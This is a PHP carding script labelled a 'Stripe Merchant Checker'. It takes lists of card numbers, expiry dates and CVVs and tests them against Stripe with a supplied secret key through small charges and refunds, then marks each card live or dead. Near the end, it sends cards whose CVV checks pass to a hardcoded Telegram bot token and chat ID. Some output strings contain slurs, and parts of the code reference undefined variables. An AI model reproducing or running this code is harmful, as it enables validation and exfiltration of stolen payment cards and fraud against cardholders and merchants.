<?php

//////////////////===========[Stripe Merchant Checker by Team Zeltrax]===========/////////////////////

error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Jakarta');
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];}

function RandomString($length = 23){
$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString     = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString;}
function emailGenerate($length = 10){
$characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$charactersLength = strlen($characters);
$randomString     = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[rand(0, $charactersLength - 1)];}
return $randomString . '@gmail.com';}

$sec1 = $_GET['sec'];
extract($_GET);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false){
return "";}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));}
function mod($dividendo,$divisor){
return round($dividendo - (floor($dividendo/$divisor)*$divisor));}
$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Authorization: Bearer '.$sec.'',));
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]=carolprogay&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
  echo $result1 = curl_exec($ch);
  $s = json_decode($result1, true);
  
  $token = $s['id'];
////////////



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'description='.$name.' '.$last.'&source='.$token.'');
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
   $result2 = curl_exec($ch);
  $cus = json_decode($result2, true);
$token3 = $cus['id'];

   // echo $token1 = $cus['id'];
   //  echo $token1 = $cus['id'];
 $message = trim(strip_tags(getStr($result2,'"message": "','"')));

 $cvvcheck = trim(strip_tags(getStr($result2,'"cvc_check": "','"')));

 $declinecode = trim(strip_tags(getStr($result2,'"code": "','"')));

echo "<span>  cvv_check = ".$cvvcheck."</span>";


//for charging cards, 
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=50&currency=usd&customer='.$token3.'');
  curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
  $result3 = curl_exec($ch);

   $char = json_decode($result3, true);
 $chtoken = trim(strip_tags(getStr($result3,'"charge": "','"')));
   $chargetoken = $char['charge'];
$decline3 = trim(strip_tags(getStr($result3,'"decline_code": "','"')));

  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/refunds');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'charge='.$chtoken.'&amount=50&reason=requested_by_customer');
  curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
 $result4 = curl_exec($ch);

//////////////////////////////
$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

/////////////////////////// [Card Response]  //////////////////////////

if(strpos($result3, '"seller_message": "Payment complete."' )) {
    echo '<span class="badge badge-success">#LIVE </span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CC-CHECKER charge + refund 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#LIVE </span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CHARGED BC 」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}


elseif(strpos($result1, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "generic_decline" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE GENERIC 3 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV - INSUFFICIENT FUND3  CC-CHECKER)」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($resul2, "do_not_honor" )) {
    echo '<span class="badge badge-success">#DEAD</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DECLINE DO NOT HONOR 3 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Fraudulent Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<span class="badge badge-info">#CCN </span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<span class="badge badge-info">#DECLINED</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-success"> 「CCN 2 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"invalid_account")){
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-danger"> 「invalid_account CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<span class="badge badge-danger">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「DO NOT HONOR 2 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> GAY「Lost Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Lost Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Stolen Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined (transaction_not_allowed) CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">#Aprovada</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (CCN3) CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Pickup Card (Reported Stolen Or Lost) CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#Decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">#decline</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Expired Card CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「PROCESSING ERROR CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> gay「PROCESSING ERROR CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Your card number is incorrect CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「service_not_allowed CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Incorrect Card Number CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result1, "do_not_honor")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Do_Not_Honor CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Declined : Generic_Decline CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Declined CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3,' "decline_code": "do_not_honor"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Do_Not_Honor 3 CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Check : Unavailable CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "unchecked"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Proxy Error CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「CVC_Unchecked : Fail CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Card Doesnt Support Purchase CC-CHECKER」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }

elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<span class="badge badge-success">#LIVE </span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved (͏CVV) CC-CHECKER AUTH ONLY  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
elseif(strpos($result3, "fraudulent" )) {
    echo '<span class="badge badge-success">#DECLINE</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Approved fraudulent CC-CHECKER」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Dead Proxy/Error Not listed CC-CHECKER」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';

}
if(strpos($result2,'"cvc_check": "pass"')){
    send_message(1274009369, "] $lista CVV PASS ★ SPARSH ★ ★ ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ ★ ");
}
elseif(strpos($result2,'"code": "incorrect_cvc"')){
    send_message(1274009369, "  $lista   CCN LIVE ★ SPARSH ★ ★ ʏᴏᴜʀ ᴄᴀʀᴅs sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ ★ ");
}

function send_message($chat_id, $message){
        $apiToken = "1308667384:AAE-gW9687pcHkD4Rxka456TLDglQFml0HM";
        $text = urlencode($message);
        file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=$chat_id&text=$text");
    }

  curl_close($curl);
  ob_flush();
  

?>